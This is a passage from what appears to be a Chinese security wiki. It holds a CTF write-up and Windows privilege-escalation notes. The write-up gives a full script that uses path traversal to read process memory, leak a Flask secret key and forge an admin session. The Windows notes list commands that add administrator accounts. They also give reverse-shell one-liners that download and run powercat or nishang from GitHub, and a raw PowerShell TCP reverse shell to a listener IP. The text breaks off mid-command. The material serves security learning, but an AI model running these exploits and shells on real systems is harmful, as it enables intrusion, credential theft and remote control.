“.”来进行分隔。flask_session默认session的储存是在用户Cookie中。但也可以指定存储在数据库，缓存中间件，服务器本地文件等等之中。 !!! secret_key 是保护 session 不被篡改的关键，没有它就无法伪造 session。 3.解题首先看到了猫的介绍，点击绿色字体可以查看详情 随便点一个进去 发现网址那里似乎可以文件包含 然后尝试php伪协议，php:input php:fliter data: 结果都不行 换一个思路，试试能不能读取上一个目录?file....etcpasswd ,可行，说明存在任意文件读取漏洞 然后是读取网站源码，先查看当前进程文件信息 ....procselfcmdline 结果是 b’python\\x00app.py\\x00’ 有个app.py 说明web是python的flask框架做的 尝试读取app.py 由于不知道它在那个位置，可以多目录穿越一次 ..app.py 解码后这段代码是一个 **Flask Web 应用程序**，主要功能是展示一些文件内容（`cat` 命令模拟），并包含一个隐藏的 `/admin` 路由，只有管理员（`session[admin] == 1`）才能访问 `flag`。 ## **代码解析**### **1. 基本设置**```pythonimport osimport uuidfrom flask import Flask, request, session, render_template, Markupfrom cat import cat # 假设 cat 是一个自定义模块，用于读取文件内容flag = app = Flask( __name__, static_url_path=/, static_folder=static # 静态文件目录)app.config[SECRET_KEY] = str(uuid.uuid4()).replace(-, ) + *abcdefgh # 随机生成密钥if os.path.isfile(/flag): flag = cat(/flag) # 读取 flag 文件内容 os.remove(/flag) # 删除 flag 文件（防止直接访问） SECRET_KEY：用于加密 Flask 的 session，这里使用 uuid 随机生成，并附加 *abcdefgh。 flag：如果存在 /flag 文件，读取其内容后删除（防止直接访问）。 2. 路由功能(1) 首页 /（GET 请求）@app.route(/, methods=[GET])def index(): detailtxt = os.listdir(./details/) # 列出 ./details/ 目录下的文件 cats_list = [] for i in detailtxt: cats_list.append(i[:i.index(.)]) # 提取文件名（去掉扩展名） return render_template(index.html, cats_list=cats_list, cat=cat) 功能：列出 ./details/ 目录下的文件，并渲染 index.html 模板。 cat 函数：可能是自定义的文件读取函数（类似 Linux cat 命令）。 (2) 文件信息 /info（GETPOST 请求）@app.route(‘info’, methods[“GET”, ‘POST’])def info(): filename “.details“ + request.args.get(‘file’, “”) # 获取 file 参数 start request.args.get(‘start’, “0”) # 获取 start 参数（默认 0） end request.args.get(‘end’, “0”) # 获取 end 参数（默认 0） name request.args.get(‘file’, “”)[:request.args.get(‘file’, “”).index(‘.’)] # 提取文件名（去掉扩展名） return render_template(detail.html, catname=name, info=cat(filename, start, end)) - **功能**：读取 `./details/file` 文件内容，并渲染 `detail.html` 模板。- **参数**： - `file`：文件名（如 `cat.txt`）。 - `start` 和 `end`：可能是文件读取的起始和结束位置（类似 `cat filename | head -n end | tail -n +start`）。---#### **(3) 管理员路由 `/admin`（GET 请求）**```python@app.route(/admin, methods=[GET])def admin_can_list_root(): if session.get(admin) == 1: return flag # 只有 admin=1 才能看到 flag else: session[admin] = 0 # 默认设置 admin=0 return NoNoNo 功能： 如果 session[admin] == 1，返回 flag（敏感信息）。 否则，返回 NoNoNo，并设置 session[admin] = 0。 漏洞：session 可以被伪造（如果 SECRET_KEY 可预测或泄露）。 3. 启动 Flask 服务器if __name__ == __main__: app.run(host=0.0.0.0, debug=False, port=5637) 监听：0.0.0.0:5637（所有网络接口）。 debug=False：生产模式（不暴露调试信息）。 安全分析1. 如何获取 flag？ 目标：让 session[admin] == 1。 方法： 伪造 session： 如果 SECRET_KEY 可预测（如 uuid + *abcdefgh），可以生成恶意 session。 使用 flask-unsign 工具伪造：flask-unsign --sign --cookie admin: 1 --secret SECRET_KEY 直接访问 /flag： 但代码已经删除 /flag 文件（os.remove(/flag)），所以不行。 2. 可能的漏洞 SECRET_KEY 可预测： 使用 uuid.uuid4() 生成，但附加了固定字符串 *abcdefgh。 如果服务器重启后 SECRET_KEY 不变，可以爆破或预测。 cat 命令注入（如果 startend 未过滤）： 如果 cat 函数直接拼接参数，可能导致命令注入（如 start=0; cat /etc/passwd）。 目录遍历（Path Traversal）： request.args.get(file) 未检查路径，可能读取任意文件（如 ../../etc/passwd）。 总结 核心功能：一个简单的文件查看 Web 应用，包含隐藏的 /admin 路由。 安全风险： session 可能被伪造（如果 SECRET_KEY 泄露）。 file 参数可能导致目录遍历。 startend 参数可能导致命令注入（取决于 cat 实现）。 攻击思路： 伪造 session 使 admin=1。 尝试读取 /flag（但已被删除）。 检查 cat 函数是否存在命令注入。 ### 关注到admin路由可以获取flag，但是需要完成session伪造，需要伪造内容为`admin : 1`的session，则需要获取secret key```python@app.route(/admin, methods=[GET])def admin_can_list_root(): if session.get(admin) == 1: return flag else: session[admin] = 0 return NoNoNosecret key: app.config[SECRET_KEY] = str(uuid.uuid4()).replace(-, ) + *abcdefgh 注意到文件读取功能是info提供的可控参数有三个，分别是file，start和end还注意到其中有个cat函数@app.route(/info, methods=[GET, POST])def info(): filename = ./details/ + request.args.get(file, ) start = request.args.get(start, 0) end = request.args.get(end, 0) name = request.args.get(file, )[:request.args.get(file, ).index(.)] return render_template(detail.html, catname=name, info=cat(filename, start, end)) 分析源码可知cat函数由cat.py提供 :from cat import cat获取cat.pyimport os, sys, getoptdef cat(filename, start=0, end=0)-bytes: data = b try: start = int(start) end = int(end) except: start=0 end=0 if filename != and os.access(filename, os.R_OK): f = open(filename, rb) if start = 0: f.seek(start) if end = start and end != 0: data = f.read(end-start) else: data = f.read() else: data = f.read() f.close() else: data = (File `%s` not exist or can not be read % filename).encode() return dataif __name__ == __main__: opts,args = getopt.getopt(sys.argv[1:],-h-f:-s:-e:,[help,file=,start=,end=]) fileName = start = 0 end = 0 for opt_name, opt_value in opts: if opt_name == -h or opt_name == --help: print([*] Help) print(-f --file File name) print(-s --start Start position) print(-e --end End position) print([*] Example of reading /etc/passwd) print(python3 cat.py -f /etc/passwd) print(python3 cat.py --file /etc/passwd) print(python3 cat.py -f /etc/passwd -s 1) print(python3 cat.py -f /etc/passwd -e 5) print(python3 cat.py -f /etc/passwd -s 1 -e 5) exit() elif opt_name == -f or opt_name == --file: fileName = opt_value elif opt_name == -s or opt_name == --start: start = opt_value elif opt_name == -e or opt_name == --end: end = opt_value if fileName != : print(cat(fileName, start, end)) else: print(No file to read) 看到了start 和 end （方便读取内存中信息）获取secret key这里可以利用python存储对象的位置在堆上这个特性，app是实例化的Flask对象，而secret key在app.config[SECRET_KEY]，所以可以通过读取/proc/self/mem来读取secret key 读取堆栈分布，由于procselfmem内容较多而且存在不可读写部分，直接读取会导致程序崩溃，所以先读取procselfmaps获取堆栈分布map_list = requests.get(url + finfo?file=bypass/proc/self/maps)map_list = map_list.text.split(\\ )for i in map_list: map_addr = re.match(r([a-z0-9]+)-([a-z0-9]+) rw, i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(Found rw addr:, start, -, end) 读取对应位置内存数据 然后读取procselfmem，读取对应位置的内存数据，再使用正则表达式查找内容res = requests.get(furl/info?file=bypass/proc/self/memstart=startend=end)if *abcdefgh in res.text: secret_key = re.findall([a-z0-9]32\\*abcdefgh, res.text) if secret_key: print(Secret Key:, secret_key[0]) 伪造sessionhttps://github.com/noraj/flask-session-cookie-manager 一键获取flag# coding=utf-8#----------------------------------####################################Edited by lx56@blog.lxscloud.top####################################----------------------------------import requestsimport reimport ast, sysfrom abc import ABCfrom flask.sessions import SecureCookieSessionInterfaceurl = http://#此程序只能运行于Python3以上if sys.version_info[0] 3: # 3.0 raise Exception(Must be using at least Python 3)#----------------session 伪造----------------class MockApp(object): def __init__(self, secret_key): self.secret_key = secret_key class FSCM(ABC): def encode(secret_key, session_cookie_structure): Encode a Flask session cookie try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return [Encoding error] .format(e) raise e#-------------------------------------------#由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret keys_key = bypass = ../..#请求file路由进行读取map_list = requests.get(url + finfo?file=bypass/proc/self/maps)map_list = map_list.text.split(\\ )for i in map_list: #匹配指定格式的地址 map_addr = re.match(r([a-z0-9]+)-([a-z0-9]+) rw, i) if map_addr: start = int(map_addr.group(1), 16) end = int(map_addr.group(2), 16) print(Found rw addr:, start, -, end) #设置起始和结束位置并读取/proc/self/mem res = requests.get(furl/info?file=bypass/proc/self/memstart=startend=end) #如果发现*abcdefgh存在其中，说明成功泄露secretkey if *abcdefgh in res.text: #正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh secret_key = re.findall([a-z0-9]32\\*abcdefgh, res.text) if secret_key: print(Secret Key:, secret_key[0]) s_key = secret_key[0] break#设置session中admin的值为1data = admin:1#伪造sessionheaders = Cookie : session= + FSCM.encode(s_key, data)#请求admin路由try: flag = requests.get(url + admin, headers=headers) print(Flag is, flag.text)except: print(Something error)","tags":[null]},{"title":"SQL注入","path":"/wiki/Web知识点/SQL注入/index.html","content":"靶场 文件夹 (包含子项) 📂 目录 SQLi流程 点击阅读详细内容... 📝 文档 SQLMAP 点击阅读详细内容... 📝 文档 SQL注入 点击阅读详细内容... 📝 文档"},{"title":"windows 提权","path":"/wiki/内网/提权/windows 提权.html","content":"基础知识1.用户和权限模型用户账户（User Account）：Windows 系统中，用户可以拥有不同的权限和角色。管理员账户（Administrator）：拥有系统的完全控制权限。 标准用户（Standard User）：具有受限的权限，不能对系统进行重要的更改。 受限用户（Restricted User）：权限更少，几乎不能修改系统设置。 系统账户（SYSTEM）：这是 Windows 操作系统内核的权限级别，比管理员更高。攻击者通过提升权限，往往会争取系统权限。 UAC（用户帐户控制）：Windows 的一个安全特性，用于防止恶意软件通过获得管理员权限来破坏系统。即使是管理员账户，也需要额外确认才能执行高权限操作。 2.访问控制列表 (ACL)Windows 访问控制列表（ACL）是用于控制对计算机资源（如文件、文件夹、注册表项等）访问权限的机制。它帮助定义哪些用户或组可以访问特定资源，以及他们可以执行哪些操作（如读取、写入、修改等）。ACL 由一系列 访问控制条目（ACE） 组成，每个 ACE 包含以下信息： 主体（Subject）：请求访问资源的用户、组或计算机。 访问权限掩码（Access Mask）：定义允许或拒绝的权限（如读取、写入、执行等）。 继承标志（Inheritance Flag）：指示子对象是否继承父对象的 ACL。 查看文件的 ACL： icacls 文件路径 更改文件的 ACL： icacls 文件路径 grant 用户名:权限 deny 用户名:权限 inheritance:级别 其中： grant：授予权限。 deny：拒绝权限。 inheritance：设置继承标志。 权限可以是： F：完全控制。 M：修改。 RX：读取和执行。 继承级别可以是： N：无继承。 R：只继承读取权限。 D：继承所有权限。 3.安全标识符 (SID)安全标识符（SID） 用于唯一标识用户、组或计算机。SID 是一种字符串，用来标识与资源访问相关的主体 S-1-5-18 (LocalSystem)S-1-5-19 (LocalService)S-1-5-20 (NetworkService)S-1-5-32-544 (Administrators)S-1-5-32-545 (Users)S-1-5-32-550 (PrintOperators) 查询 SID wmic useraccount get name,sid SID 解析 19922 S-1-5-21-273206267-380918465-181388736-1001 Vultop S-1-5-21-1205915028-4293886087-4092552726-1001 S-1-：这是 SID 的通用前缀，表示这是一个修订版为 1 的 SID。 修订版本：SID 是为 Windows NT 4.0 及以后的版本创建的。 5：修订级别，表示这是 NT 4.0 以后的版本。 21：表示颁发 SID 的领域（在 Active Directory 环境中，通常是域的相对标识符）。 领域信息：该 SID 可能属于一个具有相对标识符（RID）为 “21” 的域。 1205915028：颁发机构的安全标识符（通常是一个 GUID）。 颁发机构：由具有 GUID “1205915028” 的颁发机构创建。 4293886087 和 4092552726：表示与颁发机构 SID 相关联的子权威值。 子权威值：说明 SID 如何进一步细分和管理。 1001：这是特定主体的唯一标识符，如用户、组或服务账户。 唯一标识符：最后的数字（如 “1001”）标识特定的用户或服务账户。 针对 S-1-5-21-1004336348-1177238915-682003330-512进行解析，可以知道 SID 的版本号是 1主标识值是 5，代表 NT 权限域相关的子标识值是 21-1004336348-1177238915-682003330RID 是 512，代表 DomainAdmins 4.基本命令 命令 描述 font style=color:rgb(51, 51, 51);systeminfo/font 打印系统信息 font style=color:rgb(51, 51, 51);whoami/font 获取当前用户名 font style=color:rgb(51, 51, 51);whoami /priv/font 列出当前帐户权限 font style=color:rgb(51, 51, 51);ipconfig/font 网络配置信息 font style=color:rgb(51, 51, 51);ipconfig /displaydns/font 显示 DNS 缓存 font style=color:rgb(51, 51, 51);route print/font 打印路由表 font style=color:rgb(51, 51, 51);arp -a/font 打印 ARP 表 font style=color:rgb(51, 51, 51);hostname/font 获取主机名 font style=color:rgb(51, 51, 51);net user/font 列出用户 font style=color:rgb(51, 51, 51);net localgroup/font 列出所有组 font style=color:rgb(51, 51, 51);net view \\\\127.0.0.1/font 列出打开到当前计算机的会话 font style=color:rgb(51, 51, 51);net session/font 列出其他机器打开的会话 font style=color:rgb(51, 51, 51);netsh firewall show config/font 显示防火墙配置 font style=color:rgb(51, 51, 51);DRIVERQUERY/font 列出已安装的驱动 font style=color:rgb(51, 51, 51);tasklist /svc/font 列出服务任务 font style=color:rgb(51, 51, 51);net start/font 列出启动的服务 font style=color:rgb(51, 51, 51);dir /s foo/font 在目录中搜索包含指定字符的项目 font style=color:rgb(51, 51, 51);sc query/font 列出所有服务 font style=color:rgb(51, 51, 51);sc qc ServiceName/font 找到指定服务的路径 font style=color:rgb(51, 51, 51);shutdown /r /t 0/font 立即重启 font style=color:rgb(51, 51, 51);type file.txt/font 打印文件内容 font style=color:rgb(51, 51, 51);icacls C:\\Example/font 列出权限 font style=color:rgb(51, 51, 51);wmic qfe get Caption,Description,HotFixID,InstalledOn/font 列出已安装的补丁 font style=color:rgb(51, 51, 51);(New-Object System.Net.WebClient).DownloadFile(http://host/file,C:\\LocalPath)/font 利用 PowerShell 远程下载文件到本地 font style=color:rgb(51, 51, 51);accesschk.exe -qwsu Group/font 修改对象权限 $ query user #查看用户登陆情况$ whoami #当前用户权限$ set #环境变量$主机名 #主机名$ systeminfo #查看当前系统版本与补丁信息$ ver #查看当前服务器操作系统版本$ net user #查看用户信息$ net start #查看当前计算机开启服务名称$ netstat -ano #查看端口情况$ netstat -ano|find 3389 #查看指定端口$ tasklist #查看所有进程占用的端口$ taskkil /im xxx.exe /f #强制结束指定进程$ taskkil -PID pid # 结束某个pid号的进程$ tasklist /svc|find TermService # 查看服务pid号$ wmic os get title # 查看系统名$ wmic Product get name,version # 查看当前安装程序$ wmic qfe get Description,HotFixID,InstalledOn # 查看补丁信息$ wmic qfe get Description,HotFixID,InstalledOn | 强制结束指定进程$ findstr /C: KB4346084 /C: KB4509094 # 定位特定补丁#添加管理员用户$ net user username(用户名) password(密码) /add # 添加普通用户$ net localgroup adminstrators username /add # 把普通用户添加到管理员用户组#如果远程桌面连接不上可以添加远程桌面组$ net localgroup Remote Desktop Users username / add 项目（Item） 命令检查项（CommandCheck） 目的（Why） 系统与补丁（System Patches） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);systeminfo/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);wmic qfe get/font 确定操作系统版本、安装日期及已安装的热修复补丁（hotfixes）。 当前身份与权限（Current Identity Privileges） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);whoami/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);whoami /priv/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);whoami /all/font 识别当前用户令牌、权限（如SeImpersonate、SeDebug等）及用户组信息。 用户与组（Users Groups） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);net user/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);net localgroup administrators/font 枚举本地用户、管理员组成员。 服务与启动项（Services Startup） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sc query state=all/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sc qc 服务名/font 查找服务、启动模式及二进制路径。 计划任务（Scheduled Tasks） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);schtasks /query /fo LIST /v/font 枚举计划任务及详细信息。 文件系统与ACL（File System ACL） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);icacls C:\\Windows\\System32/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);icacls/font [敏感目录] 识别可写入的敏感目录或ACL权限配置错误。 注册表项（读取）（Registry Keys (read)） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);reg query HKLM\\SYSTEM\\CurrentControlSet\\Services/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run/font 导出服务键值、自动运行（AutoRun）条目等。 进程与镜像路径（Processes Image Paths） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);tasklist /v/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);wmic process get name,executablepath/font 识别特权进程及可执行文件路径。 环境变量（Environment Variables） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);set/font 检查PATH、TEMP、PSModulePath等是否存在可劫持的条目。 事件日志Sysmon（Event Logs Sysmon） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);wevtutil qe Security /q:* /f:text/font；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational/font（PowerShell） 收集进程创建、服务变更等日志；若存在Sysmon，则检查其事件。 UAC防御软件EDR状态（UAC Defender EDR state） font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA/font（检查UAC）；font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);Get-MpComputerStatus/font（PowerShell，检查Defender状态） 了解防御态势（如UAC是否启用、DefenderEDR状态）及可用的缓解措施。 5.常用命令 类别 命令 主要参数 功能描述 文件管理 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);dir/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/s/font 递归搜索子目录 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/b/font 简明格式(仅路径和文件名) a:[d h font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/p/font 分页显示 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/w/font 宽列表格式 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);copy/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/y/font 覆盖时不提示 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/v/font 验证文件写入正确性 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);xcopy/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/e/font 复制目录和子目录(含空目录) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/h/font 复制隐藏和系统文件 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);robocopy/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/mir/font 镜像目录树(同步删除) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/mt:n/font 多线程复制(n线程数) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);del/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/f/font 强制删除只读文件 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/s/font 从所有子目录删除指定文件 进程管理 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);tasklist/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/v/font 详细模式(显示更多信息) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/svc/font 显示进程包含的服务 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/m [module]/font 显示加载的DLL模块 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/fi filter/font 过滤器条件 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);taskkill/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/im name/font 按映像名称结束进程 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/pid id/font 按进程ID结束进程 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/f/font 强制终止进程 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/t/font 终止子进程 网络诊断 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ping/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-t/font 持续ping直到手动停止 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-n count/font 指定发送请求次数 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-l size/font size 发送缓冲区大小 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-w timeout/font 超时时间(毫秒) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ipconfig/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/all/font 显示完整配置信息 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/release/font 释放IP地址租约 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/renew/font 续订IP地址租约 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/flushdns/font 清除DNS解析缓存 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/displaydns/font 显示DNS解析缓存内容 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);netstat/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-a/font 显示所有连接和监听端口 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-n/font 以数字形式显示地址和端口号 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-b/font 显示创建连接的应用程序 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-o/font 显示拥有的进程ID font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);tracert/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-d/font 不将地址解析成主机名 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-h max_hops/font 搜索目标的最大跃点数 磁盘管理 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);chkdsk/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/f/font 修复磁盘上的错误 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/r/font 定位坏扇区并恢复可读信息 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/x/font 必要时强制卸载卷 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);format/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/fs:type/font 指定文件系统(FAT32NTFS) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/q/font 快速格式化 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/a:size/font 分配单元大小 系统服务 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sc/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);query/font 查询服务状态 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);start/font 启动服务 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);stop/font 停止服务 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);create/font 创建服务 系统信息 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);systeminfo/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/fo format/font 指定输出格式(tablelistcsv) font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);sfc/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/scannow/font 立即扫描所有受保护的系统文件 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/verifyonly/font 扫描但不修复 FTP传输 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);ftp/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-i/font 关闭交互模式 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-s:file/font 执行指定文件中的ftp命令 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);-v/font 禁止显示远程服务器响应 注册表 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);reg/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);query/font 查询注册表键值 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);add/font 添加新的注册表项 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);delete/font 删除注册表项 用户账户 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);net user/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);username /add/font 添加用户账户 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);username /delete/font 删除用户账户 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);username password/font 更改用户密码 计划任务 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);schtasks/font font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/create/font 创建新计划任务 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/delete/font 删除计划任务 font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);/query/font 显示所有计划任务 Windows反弹shell Win 192.168.129.161 KaLi 192.168.129.152powercat kali nc -lvp 5555 windows powershell -ExecutionPolicy Bypass -Command “$content Invoke-RestMethod ‘https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1; Invoke-Expression $content; powercat -c 192.168.129.152 -p 5555 -e cmd” 解释： powershell 这是调用 PowerShell 的命令。在 Windows 的命令提示符（cmd）中，你可以通过 powershell 命令启动 PowerShell 环境。 2. -ExecutionPolicy Bypass这是一个重要的参数，用于绕过 PowerShell 的执行策略限制。默认情况下，PowerShell 会限制运行未签名的脚本，以防止恶意脚本的执行。-ExecutionPolicy Bypass 选项允许你临时绕过这些限制，只在当前会话中运行指定的命令。 3. -Command这个参数用于指定要执行的 PowerShell 命令。你可以将多个命令放在一个字符串中，用分号 ; 分隔。这些命令将在同一个 PowerShell 会话中依次执行。 4. content：这是一个变量，用于存储从网络下载的内容。Invoke-RestMethod：这是一个 PowerShell 命令，用于从指定的 URL 下载内容。它会返回下载的内容，而不是保存到文件。‘https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 ‘：这是 powercat.ps1 脚本的 GitHub 原始链接。Invoke-RestMethod 会从这个 URL 下载脚本内容。 5. Invoke-Expression content：这是之前下载的脚本内容。Invoke-Expression 会将这些内容作为 PowerShell 令执行。 6. powercat -c 192.168.129.152 -p 5555 -e cmdpowercat：这是 powercat.ps1 脚本中的一个命令，用于建立网络连接。-c 192.168.129.152：指定要连接的目标 IP 地址。-p 5555：指定要连接的目标端口号。-e cmd：指定在建立连接后执行的命令。在这个例子中，cmd 表示启动 Windows 的命令提示符（cmd.exe）。 nishang kali nc -lvp 5555 windows powershell -ExecutionPolicy Bypass -Command “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1);;) Invoke-PowerShellTcp -Reverse -IPAddress 192.168.129.152 -Port 5555” 解释 自定义powershell函数反弹shell kali nc -lvp 5555 win powershell版本 powershell -nop -c “$client New-Object Net.Sockets.TCPClient(‘192.168.129.152’,5555);$stream $client.GetStream(); [byte[]]$bytes 0..65535|%{0};while(($i $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback (iex $data 21 | Out-String ); $sendback2 $sendback + ‘PS ‘ + (pwd).Path + ‘ ‘;$sendbyte ([text.encoding]::ASCII).GetBytes($sendback2); 